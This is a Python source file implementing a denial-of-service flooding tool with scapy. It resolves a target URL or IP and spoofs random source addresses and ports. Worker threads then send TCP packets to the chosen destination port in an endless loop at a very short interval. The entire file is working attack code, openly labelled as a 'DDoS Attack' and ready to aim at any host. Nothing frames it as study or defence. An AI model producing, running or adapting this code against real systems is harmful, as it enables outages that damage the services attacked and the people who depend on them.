#! /usr/bin/python

import random
from scapy.all import *
import threading
import socket
import sys
from urllib.parse import urlparse
import colors
from vault_cli import errors
import time


class DDoS(object):

    def __init__(self, url, ip, start_port, end_port, dport, threads,
                 interval):

        if url is not None and ip is not None:
            colors.error('Please provide either the URL or the IP address...')
            sys.exit(1)

        if ip is not None:
            self.target_ip = ip
        elif url is not None:
            try:
                self.target_ip = self.getIP(url)
            except Exception as e:
                errors.report_error('Could not resolve URL to IP', exc=e,
                                    code='E2003')
                sys.exit(1)
        else:
            errors.report_error('Please provide URL or the IP address to '
                                'attack...', code='E1003',
                                hint='Provide -u <url> or -ip <ip>.')
            sys.exit(1)

        if start_port is not None:
            try:
                start_port = int(start_port)
            except ValueError:
                errors.report_error('Invalid port range', code='E1009',
                                    hint='Provide a numeric start port.')
                sys.exit(1)
            if start_port > 0 and start_port < 65355:
                self.start_port = start_port
            else:
                errors.report_error('Invalid port range', code='E1009',
                                    hint='Start port must be between 1 and '
                                         '65354.')
                sys.exit(1)
        else:
            self.start_port = random.randint(1, 100)

        if end_port is not None:
            try:
                end_port = int(end_port)
            except ValueError:
                errors.report_error('Invalid port range', code='E1009',
                                    hint='Provide a numeric end port.')
                sys.exit(1)
            if end_port > 1 and end_port < 65356:
                self.end_port = end_port
            else:
                errors.report_error('Invalid port range', code='E1009',
                                    hint='End port must be between 2 and '
                                         '65355.')
                sys.exit(1)
        else:
            self.end_port = random.randint(1000, 65355)

        if dport is None:
            self.dport = 80
        else:
            try:
                dport = int(dport)
            except ValueError:
                errors.report_error('Please provide a valid destination port',
                                    code='E1009')
                sys.exit(1)
            if dport < 65356 and dport > 0:
                self.dport = dport
            else:
                errors.report_error('Please provide a valid destination port',
                                    code='E1009')
                sys.exit(1)

        if interval is not None:
            try:
                self.INTER = int(interval)
            except ValueError:
                errors.report_error('Invalid interval value',
                                    hint='Provide a numeric interval.')
                sys.exit(1)
        else:
            self.INTER = 0.0001
            colors.warning('No interval set, hence using {}s.'
                           .format(self.INTER))

        if threads is not None:
            try:
                threads = int(threads)
            except ValueError:
                errors.report_error('Invalid number of threads',
                                    code='E1011',
                                    hint='Provide a numeric thread count.')
                sys.exit(1)
            self.threadValidator(threads)
        else:
            self.threads = 1
            colors.warning('No threads set, hence using {} thread.'
                           .format(self.threads))

        self.number_of_packets = 0

    def threadValidator(self, threads):
        """
        Validates the number of threads
        """
        if threads > 100:
            choice = input('Are you sure you want to use {} threads...?'
                           'This can slow down your system.(Y/N)'
                           .format(threads))
            if choice == 'N' or choice == 'n':
                threads = int(input('>> Please enter the number of threads'
                                    ' you want to use...'))
                self.threadValidator(threads)
            else:
                self.threads = threads
        else:
            self.threads = threads

    @staticmethod
    def getIP(url):
        """
        Converts URL to IP
        """
        url = urlparse(url)
        return socket.gethostbyname(url.netloc)

    @staticmethod
    def generateIP():
        """
        Generates random IP address
        """
        ip = str(random.randint(1, 254)) + '.'\
            + str(random.randint(0, 255)) + '.'\
            + str(random.randint(0, 255)) + '.'\
            + str(random.randint(0, 255))

        return ip

    def generatePacket(self, ip, source_port):
        """
        Generates scapy packet
        """
        IP_PACKET = IP(src=ip, dst=self.target_ip)
        TCP_PACKET = TCP(sport=source_port, dport=self.dport)
        PKT = IP_PACKET/TCP_PACKET
        return PKT

    def sendPacket(self, packet):
        """
        Sends the generated packets to the destination
        """
        send(packet, inter=self.INTER, verbose=False)
        self.number_of_packets = self.number_of_packets + 1
        print('[+] Packets sent : {}'.format(self.number_of_packets), end='\r')

    def attack(self):

        while True:

            start_index = 0
            ip = self.generateIP()
            break_point = random.randint(1, 25)

            for _ in range(self.start_port, self.end_port):
                source_port = random.randint(self.start_port, self.end_port)
                newPacket = self.generatePacket(ip, source_port)
                self.sendPacket(newPacket)
                start_index = start_index + 1
                if start_index > break_point:
                    break

    def startAttack(self):

        try:
            colors.info('DDoS Attack on : {} : {}'
                        .format(self.target_ip, self.dport))

            colors.success('DDoS Attack started, press CTRL+C to stop...')

            t1 = time.time()

            threads = []

            for _ in range(self.threads):
                newThread = threading.Thread(target=self.attack)
                threads.append(newThread)
                newThread.start()

            for thread in threads:
                thread.join()

        except KeyboardInterrupt:
            t2 = time.time()
            colors.success('Completed in time : {}'.format(t2-t1))
